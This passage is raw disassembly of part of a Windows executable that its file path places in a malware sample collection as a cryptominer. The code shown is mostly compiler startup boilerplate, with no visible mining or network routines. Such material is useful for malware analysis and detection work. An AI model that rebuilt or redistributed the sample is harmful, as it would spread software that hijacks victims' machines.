
malware_samples/miner/f7856e4149afb43db04517c4516c9dce6e551b85c2b14550c991f6ef1bc8233e.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	33 d2                	xor    %edx,%edx
   140001002:	48 ff 25 37 e2 00 00 	rex.W jmp *0xe237(%rip)        # 0x14000f240
   140001009:	cc                   	int3
   14000100a:	cc                   	int3
   14000100b:	cc                   	int3
   14000100c:	40 53                	rex push %rbx
   14000100e:	48 83 ec 20          	sub    $0x20,%rsp
   140001012:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001017:	e8 40 43 00 00       	call   0x14000535c
   14000101c:	e8 4f 05 00 00       	call   0x140001570
   140001021:	8b c8                	mov    %eax,%ecx
   140001023:	e8 a0 4d 00 00       	call   0x140005dc8
   140001028:	e8 37 05 00 00       	call   0x140001564
   14000102d:	8b d8                	mov    %eax,%ebx
   14000102f:	e8 20 4f 00 00       	call   0x140005f54
   140001034:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001039:	89 18                	mov    %ebx,(%rax)
   14000103b:	e8 b0 02 00 00       	call   0x1400012f0
   140001040:	84 c0                	test   %al,%al
   140001042:	74 73                	je     0x1400010b7
   140001044:	e8 e3 07 00 00       	call   0x14000182c
   140001049:	48 8d 0d 18 08 00 00 	lea    0x818(%rip),%rcx        # 0x140001868
   140001050:	e8 4b 04 00 00       	call   0x1400014a0
   140001055:	e8 0e 05 00 00       	call   0x140001568
   14000105a:	8b c8                	mov    %eax,%ecx
   14000105c:	e8 8f 45 00 00       	call   0x1400055f0
   140001061:	85 c0                	test   %eax,%eax
   140001063:	75 52                	jne    0x1400010b7
   140001065:	e8 0e 05 00 00       	call   0x140001578
   14000106a:	e8 4d 05 00 00       	call   0x1400015bc
   14000106f:	85 c0                	test   %eax,%eax
   140001071:	74 0c                	je     0x14000107f
   140001073:	48 8d 0d ea 04 00 00 	lea    0x4ea(%rip),%rcx        # 0x140001564
   14000107a:	e8 45 43 00 00       	call   0x1400053c4
   14000107f:	e8 08 05 00 00       	call   0x14000158c
   140001084:	e8 03 05 00 00       	call   0x14000158c
   140001089:	e8 d6 04 00 00       	call   0x140001564
   14000108e:	8b c8                	mov    %eax,%ecx
   140001090:	e8 1f 4e 00 00       	call   0x140005eb4
   140001095:	e8 ee 04 00 00       	call   0x140001588
   14000109a:	84 c0                	test   %al,%al
   14000109c:	74 05                	je     0x1400010a3
   14000109e:	e8 1d 49 00 00       	call   0x1400059c0
   1400010a3:	e8 bc 04 00 00       	call   0x140001564
   1400010a8:	e8 b7 06 00 00       	call   0x140001764
   1400010ad:	85 c0                	test   %eax,%eax
   1400010af:	75 06                	jne    0x1400010b7
   1400010b1:	48 83 c4 20          	add    $0x20,%rsp
   1400010b5:	5b                   	pop    %rbx
   1400010b6:	c3                   	ret
   1400010b7:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400010bc:	e8 1f 05 00 00       	call   0x1400015e0
   1400010c1:	cc                   	int3
   1400010c2:	cc                   	int3
   1400010c3:	cc                   	int3
   1400010c4:	48 83 ec 28          	sub    $0x28,%rsp
   1400010c8:	e8 d3 04 00 00       	call   0x1400015a0
   1400010cd:	33 c0                	xor    %eax,%eax
   1400010cf:	48 83 c4 28          	add    $0x28,%rsp
   1400010d3:	c3                   	ret
   1400010d4:	48 83 ec 28          	sub    $0x28,%rsp
   1400010d8:	e8 e3 06 00 00       	call   0x1400017c0
   1400010dd:	e8 82 04 00 00       	call   0x140001564
   1400010e2:	8b c8                	mov    %eax,%ecx
   1400010e4:	48 83 c4 28          	add    $0x28,%rsp
   1400010e8:	e9 3b 4e 00 00       	jmp    0x140005f28
   1400010ed:	cc                   	int3
   1400010ee:	cc                   	int3
   1400010ef:	cc                   	int3
   1400010f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400010f5:	57                   	push   %rdi
   1400010f6:	48 83 ec 30          	sub    $0x30,%rsp
   1400010fa:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400010ff:	e8 b0 01 00 00       	call   0x1400012b4
   140001104:	84 c0                	test   %al,%al
   140001106:	0f 84 30 01 00 00    	je     0x14000123c
   14000110c:	40 32 ff             	xor    %dil,%dil
   14000110f:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001114:	e8 5f 01 00 00       	call   0x140001278
   140001119:	8a d8                	mov    %al,%bl
   14000111b:	8b 0d b7 89 01 00    	mov    0x189b7(%rip),%ecx        # 0x140019ad8
   140001121:	83 f9 01             	cmp    $0x1,%ecx
   140001124:	0f 84 1d 01 00 00    	je     0x140001247
   14000112a:	85 c9                	test   %ecx,%ecx
   14000112c:	75 4a                	jne    0x140001178
   14000112e:	c7 05 a0 89 01 00 01 	movl   $0x1,0x189a0(%rip)        # 0x140019ad8
   140001135:	00 00 00 
   140001138:	48 8d 15 99 e1 00 00 	lea    0xe199(%rip),%rdx        # 0x14000f2d8
   14000113f:	48 8d 0d 5a e1 00 00 	lea    0xe15a(%rip),%rcx        # 0x14000f2a0
   140001146:	e8 15 49 00 00       	call   0x140005a60
   14000114b:	85 c0                	test   %eax,%eax
   14000114d:	74 0a                	je     0x140001159
   14000114f:	b8 ff 00 00 00       	mov    $0xff,%eax
   140001154:	e9 d8 00 00 00       	jmp    0x140001231
   140001159:	48 8d 15 38 e1 00 00 	lea    0xe138(%rip),%rdx        # 0x14000f298
   140001160:	48 8d 0d 21 e1 00 00 	lea    0xe121(%rip),%rcx        # 0x14000f288
   140001167:	e8 b0 48 00 00       	call   0x140005a1c
   14000116c:	c7 05 62 89 01 00 02 	movl   $0x2,0x18962(%rip)        # 0x140019ad8
   140001173:	00 00 00 
   140001176:	eb 08                	jmp    0x140001180
   140001178:	40 b7 01             	mov    $0x1,%dil
   14000117b:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001180:	8a cb                	mov    %bl,%cl
   140001182:	e8 8d 02 00 00       	call   0x140001414
   140001187:	e8 3c 04 00 00       	call   0x1400015c8
   14000118c:	48 8b d8             	mov    %rax,%rbx
   14000118f:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001193:	74 1e                	je     0x1400011b3
   140001195:	48 8b c8             	mov    %rax,%rcx
   140001198:	e8 df 01 00 00       	call   0x14000137c
   14000119d:	84 c0                	test   %al,%al
   14000119f:	74 12                	je     0x1400011b3
   1400011a1:	45 33 c0             	xor    %r8d,%r8d
   1400011a4:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400011a8:	33 c9                	xor    %ecx,%ecx
   1400011aa:	48 8b 03             	mov    (%rbx),%rax
   1400011ad:	ff 15 ad e0 00 00    	call   *0xe0ad(%rip)        # 0x14000f260
   1400011b3:	e8 18 04 00 00       	call   0x1400015d0
   1400011b8:	48 8b d8             	mov    %rax,%rbx
   1400011bb:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400011bf:	74 14                	je     0x1400011d5
   1400011c1:	48 8b c8             	mov    %rax,%rcx
   1400011c4:	e8 b3 01 00 00       	call   0x14000137c
   1400011c9:	84 c0                	test   %al,%al
   1400011cb:	74 08                	je     0x1400011d5
   1400011cd:	48 8b 0b             	mov    (%rbx),%rcx
   1400011d0:	e8 a7 4b 00 00       	call   0x140005d7c
   1400011d5:	e8 4e 05 00 00       	call   0x140001728
   1400011da:	0f b7 d8             	movzwl %ax,%ebx
   1400011dd:	e8 e6 47 00 00       	call   0x1400059c8
   1400011e2:	44 8b cb             	mov    %ebx,%r9d
   1400011e5:	4c 8b c0             	mov    %rax,%r8
   1400011e8:	33 d2                	xor    %edx,%edx
   1400011ea:	48 8d 0d 0f ee ff ff 	lea    -0x11f1(%rip),%rcx        # 0x140000000
   1400011f1:	e8 0a fe ff ff       	call   0x140001000
   1400011f6:	8b d8                	mov    %eax,%ebx
   1400011f8:	e8 6f 05 00 00       	call   0x14000176c
   1400011fd:	84 c0                	test   %al,%al
   1400011ff:	74 50                	je     0x140001251
   140001201:	40 84 ff             	test   %dil,%dil
   140001204:	75 05                	jne    0x14000120b
   140001206:	e8 55 4b 00 00       	call   0x140005d60
   14000120b:	33 d2                	xor    %edx,%edx
   14000120d:	b1 01                	mov    $0x1,%cl
   14000120f:	e8 24 02 00 00       	call   0x140001438
   140001214:	8b c3                	mov    %ebx,%eax
   140001216:	eb 19                	jmp    0x140001231
   140001218:	8b d8                	mov    %eax,%ebx
   14000121a:	e8 4d 05 00 00       	call   0x14000176c
   14000121f:	84 c0                	test   %al,%al
   140001221:	74 36                	je     0x140001259
   140001223:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140001228:	75 05                	jne    0x14000122f
   14000122a:	e8 21 4b 00 00       	call   0x140005d50
   14000122f:	8b c3                	mov    %ebx,%eax
   140001231:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001236:	48 83 c4 30          	add    $0x30,%rsp
   14000123a:	5f                   	pop    %rdi
   14000123b:	c3                   	ret
   14000123c:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001241:	e8 9a 03 00 00       	call   0x1400015e0
   140001246:	90                   	nop
   140001247:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000124c:	e8 8f 03 00 00       	call   0x1400015e0
   140001251:	8b cb                	mov    %ebx,%ecx
   140001253:	e8 64 4b 00 00       	call   0x140005dbc
   140001258:	90                   	nop
   140001259:	8b cb                	mov    %ebx,%ecx
   14000125b:	e8 10 4b 00 00       	call   0x140005d70
   140001260:	90                   	nop
   140001261:	cc                   	int3
   140001262:	cc                   	int3
   140001263:	cc                   	int3
   140001264:	48 83 ec 28          	sub    $0x28,%rsp
   140001268:	e8 4b 02 00 00       	call   0x1400014b8
   14000126d:	48 83 c4 28          	add    $0x28,%rsp
   140001271:	e9 7a fe ff ff       	jmp    0x1400010f0
   140001276:	cc                   	int3
   140001277:	cc                   	int3
   140001278:	48 83 ec 28          	sub    $0x28,%rsp
   14000127c:	e8 cf 07 00 00       	call   0x140001a50
   140001281:	85 c0                	test   %eax,%eax
   140001283:	74 21                	je     0x1400012a6
   140001285:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   14000128c:	00 00 
   14000128e:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001292:	eb 05                	jmp    0x140001299
   140001294:	48 3b c8             	cmp    %rax,%rcx
   140001297:	74 14                	je     0x1400012ad
   140001299:	33 c0                	xor    %eax,%eax
   14000129b:	f0 48 0f b1 0d 3c 88 	lock cmpxchg %rcx,0x1883c(%rip)        # 0x140019ae0
   1400012a2:	01 00 
   1400012a4:	75 ee                	jne    0x140001294
   1400012a6:	32 c0                	xor    %al,%al
   1400012a8:	48 83 c4 28          	add    $0x28,%rsp
   1400012ac:	c3                   	ret
   1400012ad:	b0 01                	mov    $0x1,%al
   1400012af:	eb f7                	jmp    0x1400012a8
   1400012b1:	cc                   	int3
   1400012b2:	cc                   	int3
   1400012b3:	cc                   	int3
   1400012b4:	48 83 ec 28          	sub    $0x28,%rsp
   1400012b8:	85 c9                	test   %ecx,%ecx
   1400012ba:	75 07                	jne    0x1400012c3
   1400012bc:	c6 05 25 88 01 00 01 	movb   $0x1,0x18825(%rip)        # 0x140019ae8
   1400012c3:	e8 dc 05 00 00       	call   0x1400018a4
   1400012c8:	e8 ab 09 00 00       	call   0x140001c78
   1400012cd:	84 c0                	test   %al,%al
   1400012cf:	75 04                	jne    0x1400012d5
   1400012d1:	32 c0                	xor    %al,%al
   1400012d3:	eb 14                	jmp    0x1400012e9
   1400012d5:	e8 ba 51 00 00       	call   0x140006494
   1400012da:	84 c0                	test   %al,%al
   1400012dc:	75 09                	jne    0x1400012e7
   1400012de:	33 c9                	xor    %ecx,%ecx
   1400012e0:	e8 bb 09 00 00       	call   0x140001ca0
   1400012e5:	eb ea                	jmp    0x1400012d1
   1400012e7:	b0 01                	mov    $0x1,%al
   1400012e9:	48 83 c4 28          	add    $0x28,%rsp
   1400012ed:	c3                   	ret
   1400012ee:	cc                   	int3
   1400012ef:	cc                   	int3
   1400012f0:	40 53                	rex push %rbx
   1400012f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012f6:	80 3d ec 87 01 00 00 	cmpb   $0x0,0x187ec(%rip)        # 0x140019ae9
   1400012fd:	8b d9                	mov    %ecx,%ebx
   1400012ff:	75 67                	jne    0x140001368
   140001301:	83 f9 01             	cmp    $0x1,%ecx
   140001304:	77 6a                	ja     0x140001370
   140001306:	e8 45 07 00 00       	call   0x140001a50
   14000130b:	85 c0                	test   %eax,%eax
   14000130d:	74 28                	je     0x140001337
   14000130f:	85 db                	test   %ebx,%ebx
   140001311:	75 24                	jne    0x140001337
   140001313:	48 8d 0d d6 87 01 00 	lea    0x187d6(%rip),%rcx        # 0x140019af0
   14000131a:	e8 d9 4f 00 00       	call   0x1400062f8
   14000131f:	85 c0                	test   %eax,%eax
   140001321:	75 10                	jne    0x140001333
   140001323:	48 8d 0d de 87 01 00 	lea    0x187de(%rip),%rcx        # 0x140019b08
   14000132a:	e8 c9 4f 00 00       	call   0x1400062f8
   14000132f:	85 c0                	test   %eax,%eax
   140001331:	74 2e                	je     0x140001361
   140001333:	32 c0                	xor    %al,%al
   140001335:	eb 33                	jmp    0x14000136a
   140001337:	66 0f 6f 05 01 e0 00 	movdqa 0xe001(%rip),%xmm0        # 0x14000f340
   14000133e:	00 
   14000133f:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140001343:	f3 0f 7f 05 a5 87 01 	movdqu %xmm0,0x187a5(%rip)        # 0x140019af0
   14000134a:	00 
   14000134b:	48 89 05 ae 87 01 00 	mov    %rax,0x187ae(%rip)        # 0x140019b00
   140001352:	f3 0f 7f 05 ae 87 01 	movdqu %xmm0,0x187ae(%rip)        # 0x140019b08
   140001359:	00 
   14000135a:	48 89 05 b7 87 01 00 	mov    %rax,0x187b7(%rip)        # 0x140019b18
   140001361:	c6 05 81 87 01 00 01 	movb   $0x1,0x18781(%rip)        # 0x140019ae9
   140001368:	b0 01                	mov    $0x1,%al
   14000136a:	48 83 c4 20          	add    $0x20,%rsp
   14000136e:	5b                   	pop    %rbx
   14000136f:	c3                   	ret
   140001370:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001375:	e8 66 02 00 00       	call   0x1400015e0
   14000137a:	cc                   	int3
   14000137b:	cc                   	int3
   14000137c:	48 83 ec 18          	sub    $0x18,%rsp
   140001380:	4c 8b c1             	mov    %rcx,%r8
   140001383:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140001388:	66 39 05 71 ec ff ff 	cmp    %ax,-0x138f(%rip)        # 0x140000000
   14000138f:	75 78                	jne    0x140001409
   140001391:	48 63 0d a4 ec ff ff 	movslq -0x135c(%rip),%rcx        # 0x14000003c
   140001398:	48 8d 15 61 ec ff ff 	lea    -0x139f(%rip),%rdx        # 0x140000000
   14000139f:	48 03 ca             	add    %rdx,%rcx
   1400013a2:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400013a8:	75 5f                	jne    0x140001409
   1400013aa:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400013af:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400013b3:	75 54                	jne    0x140001409
   1400013b5:	4c 2b c2             	sub    %rdx,%r8
   1400013b8:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   1400013bc:	48 83 c2 18          	add    $0x18,%rdx
   1400013c0:	48 03 d1             	add    %rcx,%rdx
   1400013c3:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400013c7:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400013cb:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1400013cf:	48 89 14 24          	mov    %rdx,(%rsp)
   1400013d3:	49 3b d1             	cmp    %r9,%rdx
   1400013d6:	74 18                	je     0x1400013f0
   1400013d8:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1400013db:	4c 3b c1             	cmp    %rcx,%r8
   1400013de:	72 0a                	jb     0x1400013ea
   1400013e0:	8b 42 08             	mov    0x8(%rdx),%eax
   1400013e3:	03 c1                	add    %ecx,%eax
   1400013e5:	4c 3b c0             	cmp    %rax,%r8
   1400013e8:	72 08                	jb     0x1400013f2
   1400013ea:	48 83 c2 28          	add    $0x28,%rdx
   1400013ee:	eb df                	jmp    0x1400013cf
   1400013f0:	33 d2                	xor    %edx,%edx
   1400013f2:	48 85 d2             	test   %rdx,%rdx
   1400013f5:	75 04                	jne    0x1400013fb
   1400013f7:	32 c0                	xor    %al,%al
   1400013f9:	eb 14                	jmp    0x14000140f
   1400013fb:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   1400013ff:	7d 04                	jge    0x140001405
   140001401:	32 c0                	xor    %al,%al
   140001403:	eb 0a                	jmp    0x14000140f
   140001405:	b0 01                	mov    $0x1,%al
   140001407:	eb 06                	jmp    0x14000140f
   140001409:	32 c0                	xor    %al,%al
   14000140b:	eb 02                	jmp    0x14000140f
   14000140d:	32 c0                	xor    %al,%al
   14000140f:	48 83 c4 18          	add    $0x18,%rsp
   140001413:	c3                   	ret
   140001414:	40 53                	rex push %rbx
   140001416:	48 83 ec 20          	sub    $0x20,%rsp
   14000141a:	8a d9                	mov    %cl,%bl
   14000141c:	e8 2f 06 00 00       	call   0x140001a50
   140001421:	33 d2                	xor    %edx,%edx
   140001423:	85 c0                	test   %eax,%eax
   140001425:	74 0b                	je     0x140001432
   140001427:	84 db                	test   %bl,%bl
   140001429:	75 07                	jne    0x140001432
   14000142b:	48 87 15 ae 86 01 00 	xchg   %rdx,0x186ae(%rip)        # 0x140019ae0
   140001432:	48 83 c4 20          	add    $0x20,%rsp
   140001436:	5b                   	pop    %rbx
   140001437:	c3                   	ret
   140001438:	40 53                	rex push %rbx
   14000143a:	48 83 ec 20          	sub    $0x20,%rsp
   14000143e:	80 3d a3 86 01 00 00 	cmpb   $0x0,0x186a3(%rip)        # 0x140019ae8
   140001445:	8a d9                	mov    %cl,%bl
   140001447:	74 04                	je     0x14000144d
   140001449:	84 d2                	test   %dl,%dl
   14000144b:	75 0c                	jne    0x140001459
   14000144d:	e8 56 50 00 00       	call   0x1400064a8
   140001452:	8a cb                	mov    %bl,%cl
   140001454:	e8 47 08 00 00       	call   0x140001ca0
   140001459:	b0 01                	mov    $0x1,%al
   14000145b:	48 83 c4 20          	add    $0x20,%rsp
   14000145f:	5b                   	pop    %rbx
   140001460:	c3                   	ret
   140001461:	cc                   	int3
   140001462:	cc                   	int3
   140001463:	cc                   	int3
   140001464:	40 53                	rex push %rbx
   140001466:	48 83 ec 20          	sub    $0x20,%rsp
   14000146a:	48 83 3d 7e 86 01 00 	cmpq   $0xffffffffffffffff,0x1867e(%rip)        # 0x140019af0
   140001471:	ff 
   140001472:	48 8b d9             	mov    %rcx,%rbx
   140001475:	75 07                	jne    0x14000147e
   140001477:	e8 28 4e 00 00       	call   0x1400062a4
   14000147c:	eb 0f                	jmp    0x14000148d
   14000147e:	48 8b d3             	mov    %rbx,%rdx
   140001481:	48 8d 0d 68 86 01 00 	lea    0x18668(%rip),%rcx        # 0x140019af0
   140001488:	e8 93 4e 00 00       	call   0x140006320
   14000148d:	33 d2                	xor    %edx,%edx
   14000148f:	85 c0                	test   %eax,%eax
   140001491:	48 0f 44 d3          	cmove  %rbx,%rdx
   140001495:	48 8b c2             	mov    %rdx,%rax
   140001498:	48 83 c4 20          	add    $0x20,%rsp
   14000149c:	5b                   	pop    %rbx
   14000149d:	c3                   	ret
   14000149e:	cc                   	int3
   14000149f:	cc                   	int3
   1400014a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400014a4:	e8 bb ff ff ff       	call   0x140001464
   1400014a9:	48 f7 d8             	neg    %rax
   1400014ac:	1b c0                	sbb    %eax,%eax
   1400014ae:	f7 d8                	neg    %eax
   1400014b0:	ff c8                	dec    %eax
   1400014b2:	48 83 c4 28          	add    $0x28,%rsp
   1400014b6:	c3                   	ret
   1400014b7:	cc                   	int3
   1400014b8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400014bd:	55                   	push   %rbp
   1400014be:	48 8b ec             	mov    %rsp,%rbp
   1400014c1:	48 83 ec 30          	sub    $0x30,%rsp
   1400014c5:	48 8b 05 74 7b 01 00 	mov    0x17b74(%rip),%rax        # 0x140019040
   1400014cc:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1400014d3:	2b 00 00 
   1400014d6:	48 3b c3             	cmp    %rbx,%rax
   1400014d9:	75 74                	jne    0x14000154f
   1400014db:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   1400014e0:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400014e4:	ff 15 3e db 00 00    	call   *0xdb3e(%rip)        # 0x14000f028
   1400014ea:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400014ee:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400014f2:	ff 15 28 db 00 00    	call   *0xdb28(%rip)        # 0x14000f020
   1400014f8:	8b c0                	mov    %eax,%eax
   1400014fa:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400014fe:	ff 15 14 db 00 00    	call   *0xdb14(%rip)        # 0x14000f018
   140001504:	8b c0                	mov    %eax,%eax
   140001506:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000150a:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   14000150e:	ff 15 fc da 00 00    	call   *0xdafc(%rip)        # 0x14000f010
   140001514:	8b 45 18             	mov    0x18(%rbp),%eax
   140001517:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000151b:	48 c1 e0 20          	shl    $0x20,%rax
   14000151f:	48 33 45 18          	xor    0x18(%rbp),%rax
   140001523:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   140001527:	48 33 c1             	xor    %rcx,%rax
   14000152a:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140001531:	ff 00 00 
   140001534:	48 23 c1             	and    %rcx,%rax
   140001537:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   14000153e:	2b 00 00 
   140001541:	48 3b c3             	cmp    %rbx,%rax
   140001544:	48 0f 44 c1          	cmove  %rcx,%rax
   140001548:	48 89 05 f1 7a 01 00 	mov    %rax,0x17af1(%rip)        # 0x140019040
   14000154f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140001554:	48 f7 d0             	not    %rax
   140001557:	48 89 05 22 7b 01 00 	mov    %rax,0x17b22(%rip)        # 0x140019080
   14000155e:	48 83 c4 30          	add    $0x30,%rsp
   140001562:	5d                   	pop    %rbp
   140001563:	c3                   	ret
   140001564:	33 c0                	xor    %eax,%eax
   140001566:	c3                   	ret
   140001567:	cc                   	int3
   140001568:	b8 01 00 00 00       	mov    $0x1,%eax
   14000156d:	c3                   	ret
   14000156e:	cc                   	int3
   14000156f:	cc                   	int3
   140001570:	b8 00 40 00 00       	mov    $0x4000,%eax
   140001575:	c3                   	ret
   140001576:	cc                   	int3
   140001577:	cc                   	int3
   140001578:	48 8d 0d a1 85 01 00 	lea    0x185a1(%rip),%rcx        # 0x140019b20
   14000157f:	48 ff 25 aa da 00 00 	rex.W jmp *0xdaaa(%rip)        # 0x14000f030
   140001586:	cc                   	int3
   140001587:	cc                   	int3
   140001588:	b0 01                	mov    $0x1,%al
   14000158a:	c3                   	ret
   14000158b:	cc                   	int3
   14000158c:	c2 00 00             	ret    $0x0
   14000158f:	cc                   	int3
   140001590:	48 8d 05 99 85 01 00 	lea    0x18599(%rip),%rax        # 0x140019b30
   140001597:	c3                   	ret
   140001598:	48 8d 05 99 85 01 00 	lea    0x18599(%rip),%rax        # 0x140019b38
   14000159f:	c3                   	ret
   1400015a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400015a4:	e8 e7 ff ff ff       	call   0x140001590
   1400015a9:	48 83 08 24          	orq    $0x24,(%rax)
   1400015ad:	e8 e6 ff ff ff       	call   0x140001598
   1400015b2:	48 83 08 02          	orq    $0x2,(%rax)
   1400015b6:	48 83 c4 28          	add    $0x28,%rsp
   1400015ba:	c3                   	ret
   1400015bb:	cc                   	int3
   1400015bc:	33 c0                	xor    %eax,%eax
   1400015be:	39 05 50 7a 01 00    	cmp    %eax,0x17a50(%rip)        # 0x140019014
   1400015c4:	0f 94 c0             	sete   %al
   1400015c7:	c3                   	ret
   1400015c8:	48 8d 05 a1 97 01 00 	lea    0x197a1(%rip),%rax        # 0x14001ad70
   1400015cf:	c3                   	ret
   1400015d0:	48 8d 05 91 97 01 00 	lea    0x19791(%rip),%rax        # 0x14001ad68
   1400015d7:	c3                   	ret
   1400015d8:	83 25 61 85 01 00 00 	andl   $0x0,0x18561(%rip)        # 0x140019b40
   1400015df:	c3                   	ret
   1400015e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400015e5:	55                   	push   %rbp
   1400015e6:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1400015ed:	ff 
   1400015ee:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1400015f5:	8b d9                	mov    %ecx,%ebx
   1400015f7:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400015fc:	ff 15 6e da 00 00    	call   *0xda6e(%rip)        # 0x14000f070
   140001602:	85 c0                	test   %eax,%eax
   140001604:	74 04                	je     0x14000160a
   140001606:	8b cb                	mov    %ebx,%ecx
   140001608:	cd 29                	int    $0x29
   14000160a:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000160f:	e8 c4 ff ff ff       	call   0x1400015d8
   140001614:	33 d2                	xor    %edx,%edx
   140001616:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000161a:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140001620:	e8 cb c7 00 00       	call   0x14000ddf0
   140001625:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001629:	ff 15 09 da 00 00    	call   *0xda09(%rip)        # 0x14000f038
   14000162f:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140001636:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   14000163d:	48 8b cb             	mov    %rbx,%rcx
   140001640:	45 33 c0             	xor    %r8d,%r8d
   140001643:	ff 15 f7 d9 00 00    	call   *0xd9f7(%rip)        # 0x14000f040
   140001649:	48 85 c0             	test   %rax,%rax
   14000164c:	74 3c                	je     0x14000168a
   14000164e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001654:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   14000165b:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140001662:	4c 8b c8             	mov    %rax,%r9
   140001665:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000166a:	4c 8b c3             	mov    %rbx,%r8
   14000166d:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140001674:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001679:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000167d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001682:	33 c9                	xor    %ecx,%ecx
   140001684:	ff 15 be d9 00 00    	call   *0xd9be(%rip)        # 0x14000f048
   14000168a:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140001691:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001696:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   14000169d:	33 d2                	xor    %edx,%edx
   14000169f:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1400016a6:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400016ac:	48 83 c0 08          	add    $0x8,%rax
   1400016b0:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1400016b7:	e8 34 c7 00 00       	call   0x14000ddf0
   1400016bc:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400016c3:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400016c8:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1400016cf:	40 
   1400016d0:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1400016d7:	00 
   1400016d8:	ff 15 72 d9 00 00    	call   *0xd972(%rip)        # 0x14000f050
   1400016de:	8b d8                	mov    %eax,%ebx
   1400016e0:	33 c9                	xor    %ecx,%ecx
   1400016e2:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400016e7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400016ec:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400016f0:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400016f5:	ff 15 65 d9 00 00    	call   *0xd965(%rip)        # 0x14000f060
   1400016fb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001700:	ff 15 52 d9 00 00    	call   *0xd952(%rip)        # 0x14000f058
   140001706:	85 c0                	test   %eax,%eax
   140001708:	75 0d                	jne    0x140001717
   14000170a:	83 fb 01             	cmp    $0x1,%ebx
   14000170d:	74 08                	je     0x140001717
   14000170f:	8d 48 03             	lea    0x3(%rax),%ecx
   140001712:	e8 c1 fe ff ff       	call   0x1400015d8
   140001717:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000171e:	00 
   14000171f:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140001726:	5d                   	pop    %rbp
   140001727:	c3                   	ret
   140001728:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000172f:	33 d2                	xor    %edx,%edx
   140001731:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
